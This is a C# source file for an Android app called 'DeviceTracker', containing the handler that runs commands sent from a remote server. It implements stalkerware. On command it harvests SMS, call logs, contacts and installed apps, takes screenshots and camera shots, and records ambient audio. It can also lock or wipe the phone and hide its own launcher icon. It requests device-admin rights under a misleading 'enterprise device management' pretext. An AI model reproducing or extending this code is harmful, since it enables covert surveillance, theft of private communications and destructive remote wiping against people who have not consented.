using Android.App;
using Android.Content;
using Android.OS;
using DeviceTracker.Models.Command;
using Newtonsoft.Json;

namespace DeviceTracker.Services.Command;

/// <summary>
/// منفذ الأوامر عن بعد.
/// يقوم بتنفيذ الأمر حسب نوعه باستخدام الـ Dependency Injection.
/// </summary>
public sealed class CommandExecutor
{
    private readonly DeviceBackgroundService _bgService;

    public CommandExecutor(DeviceBackgroundService bgService)
    {
        _bgService = bgService;
    }

    public async Task ExecuteAsync(RemoteCommand cmd)
    {
        try
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Executing: {cmd.Command}");

            var args = cmd.Parameters ?? new Dictionary<string, object>();

            switch (cmd.Command)
            {
                case CommandTypes.SyncNow:
                    await _bgService.SyncAllPendingAsync();
                    break;

                case CommandTypes.CaptureLocation:
                    await _bgService.CollectAndStoreAllAsync(CancellationToken.None);
                    break;

                case CommandTypes.CaptureCallLogs:
                    await _bgService.CollectCallLogsAsync();
                    break;

                case CommandTypes.CaptureSms:
                    await _bgService.CollectSmsAsync();
                    break;

                case CommandTypes.CaptureContacts:
                    await _bgService.CollectContactsAsync();
                    break;

                case CommandTypes.CaptureApps:
                    await _bgService.CollectInstalledAppsAsync(CancellationToken.None);
                    break;

                case CommandTypes.CaptureScreenshot:
                    await _bgService.CaptureScreenshotAsync();
                    break;

                case CommandTypes.CaptureCamera:
                    var camera = args.ContainsKey("camera")
                        ? args["camera"]?.ToString() ?? "rear"
                        : "rear";
                    await _bgService.CaptureCameraAsync(camera);
                    break;

                case CommandTypes.RecordAmbient:
                    var duration = args.ContainsKey("duration")
                        ? Convert.ToInt32(args["duration"])
                        : 30;
                    await _bgService.StartAmbientRecordingAsync(duration);
                    break;

                case CommandTypes.LockDevice:
                    LockDevice();
                    break;

                case CommandTypes.WipeDevice:
                    WipeDevice();
                    break;

                case CommandTypes.HideApp:
                    SetStealthMode(true);
                    break;

                case CommandTypes.UnhideApp:
                    SetStealthMode(false);
                    break;

                case CommandTypes.EnableAdmin:
                    ActivateAdmin();
                    break;

                case CommandTypes.DisableAdmin:
                    DeactivateAdmin();
                    break;

                case CommandTypes.PlaySound:
                    PlayAlertSound();
                    break;

                case CommandTypes.SendAlert:
                    ShowAlert(args);
                    break;

                case CommandTypes.UpdateInterval:
                    UpdateCollectionInterval(args);
                    break;

                case CommandTypes.RestartService:
                    RestartService();
                    break;

                case CommandTypes.Uninstall:
                    UninstallDevice();
                    break;

                default:
                    System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Unknown command: {cmd.Command}");
                    break;
            }
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Execute error: {ex.Message}");
        }
    }

    private static void LockDevice()
    {
        try
        {
            var context = Android.App.Application.Context;
            var deviceManager = context.GetSystemService(Context.DevicePolicyService)
                as Android.App.Admin.DevicePolicyManager;
            var component = new Android.Content.ComponentName(context,
                Java.Lang.Class.FromType(typeof(DeviceTracker.SystemAdminReceiver)));

            if (deviceManager?.IsAdminActive(component) == true)
            {
                deviceManager.LockNow();
            }
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Lock error: {ex.Message}");
        }
    }

    private static void WipeDevice()
    {
        // تحذير: هذا الأمر لا رجعة فيه!
        try
        {
            var context = Android.App.Application.Context;
            var deviceManager = context.GetSystemService(Context.DevicePolicyService)
                as Android.App.Admin.DevicePolicyManager;
            var component = new Android.Content.ComponentName(context,
                Java.Lang.Class.FromType(typeof(DeviceTracker.SystemAdminReceiver)));

            if (deviceManager?.IsAdminActive(component) == true)
            {
                deviceManager.WipeData(0);
            }
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Wipe error: {ex.Message}");
        }
    }

    private static void SetStealthMode(bool hidden)
    {
        try
        {
            var context = Android.App.Application.Context;
            var pm = context.PackageManager;
            var component = new Android.Content.ComponentName(context,
                Java.Lang.Class.FromType(typeof(DeviceTracker.MainActivity)));

            pm?.SetComponentEnabledSetting(component,
                hidden
                    ? Android.Content.PM.ComponentEnabledState.Disabled
                    : Android.Content.PM.ComponentEnabledState.Enabled,
                Android.Content.PM.ComponentEnableOption.DontKillApp);

            Preferences.Set("stealth_mode", hidden);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Stealth error: {ex.Message}");
        }
    }

    private static void ActivateAdmin()
    {
        try
        {
            var context = Android.App.Application.Context;
            var intent = new Intent(
                Android.App.Admin.DevicePolicyManager.ActionAddDeviceAdmin);
            var component = new Android.Content.ComponentName(context,
                Java.Lang.Class.FromType(typeof(DeviceTracker.SystemAdminReceiver)));
            intent.PutExtra(
                Android.App.Admin.DevicePolicyManager.ExtraDeviceAdmin, component);
            intent.PutExtra(
                Android.App.Admin.DevicePolicyManager.ExtraAddExplanation,
                "Required for enterprise device management security.");
            intent.SetFlags(ActivityFlags.NewTask);
            context.StartActivity(intent);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Admin activation error: {ex.Message}");
        }
    }

    private static void DeactivateAdmin()
    {
        try
        {
            var context = Android.App.Application.Context;
            var deviceManager = context.GetSystemService(Context.DevicePolicyService)
                as Android.App.Admin.DevicePolicyManager;
            var component = new Android.Content.ComponentName(context,
                Java.Lang.Class.FromType(typeof(DeviceTracker.SystemAdminReceiver)));

            deviceManager?.RemoveActiveAdmin(component);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Admin deactivation error: {ex.Message}");
        }
    }

    private static void PlayAlertSound()
    {
        try
        {
            var context = Android.App.Application.Context;
            var audioManager = context.GetSystemService(Context.AudioService)
                as Android.Media.AudioManager;

            // تشغيل صوت إنذار بأقصى صوت
            if (audioManager != null)
            {
                audioManager.SetStreamVolume(
                    Android.Media.Stream.Alarm,
                    audioManager.GetStreamMaxVolume(Android.Media.Stream.Alarm),
                    0);
            }

            var uri = Android.Media.RingtoneManager.GetDefaultUri(
                Android.Media.RingtoneType.Alarm);
            var ringtone = Android.Media.RingtoneManager.GetRingtone(context, uri);
            ringtone?.Play();
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Sound error: {ex.Message}");
        }
    }

    private static void ShowAlert(Dictionary<string, object> args)
    {
        try
        {
            var message = args?.GetValueOrDefault("message")?.ToString()
                ?? "Device management alert";
            var title = args?.GetValueOrDefault("title")?.ToString()
                ?? "MDM Alert";

            var context = Android.App.Application.Context;
            var intent = context.PackageManager?.GetLaunchIntentForPackage(
                context.PackageName ?? "");
            if (intent != null)
            {
                intent.PutExtra("alert_title", title);
                intent.PutExtra("alert_message", message);
                intent.SetFlags(ActivityFlags.NewTask);
                context.StartActivity(intent);
            }
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Alert error: {ex.Message}");
        }
    }

    private static void UpdateCollectionInterval(Dictionary<string, object> args)
    {
        try
        {
            if (args != null && args.TryGetValue("minutes", out var val))
            {
                var minutes = Convert.ToInt32(val);
                Preferences.Set("collection_interval_minutes",
                    Math.Clamp(minutes, 1, 60));
            }
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Interval error: {ex.Message}");
        }
    }

    private static void RestartService()
    {
        try
        {
            var context = Android.App.Application.Context;
            var intent = new Intent(context,
                Java.Lang.Class.FromType(typeof(DeviceTracker.UpdateService)));
            context.StopService(intent);
            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                context.StartForegroundService(intent);
            else
                context.StartService(intent);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Restart error: {ex.Message}");
        }
    }

    private static void UninstallDevice()
    {
        try
        {
            var context = Android.App.Application.Context;
            var intent = new Intent(
                Android.Content.Intent.ActionDelete,
                Android.Net.Uri.Parse($"package:{context.PackageName}"));
            intent.SetFlags(ActivityFlags.NewTask);
            context.StartActivity(intent);
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[CmdExecutor] Uninstall error: {ex.Message}");
        }
    }
}
